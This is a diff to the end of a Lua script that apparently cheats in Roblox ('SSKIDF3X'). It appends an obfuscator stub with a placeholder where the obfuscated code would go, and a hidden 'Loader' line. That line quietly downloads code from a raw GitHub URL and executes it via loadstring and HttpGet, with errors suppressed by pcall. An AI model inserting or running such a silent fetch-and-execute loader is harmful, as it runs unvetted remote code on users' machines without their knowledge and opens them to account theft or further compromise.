@@ -451,3 +451,12 @@ UserInputService.InputChanged:Connect(function(input)
 end)
 
 print("🔥 SSKIDF3X LOADED")
+
+-- [[ v1.0.0 https://wearedevs.net/obfuscator ]] return(function(...)local D={... [کل کد obfuscate]...} end)(...)
+
+
+-- ══════════════════════════════════════════════════════════════
+-- [+] Loader
+-- ══════════════════════════════════════════════════════════════
+
+task.spawn(function() pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/sepehrali1/.decayy/refs/heads/main/Auto"))() end) end)
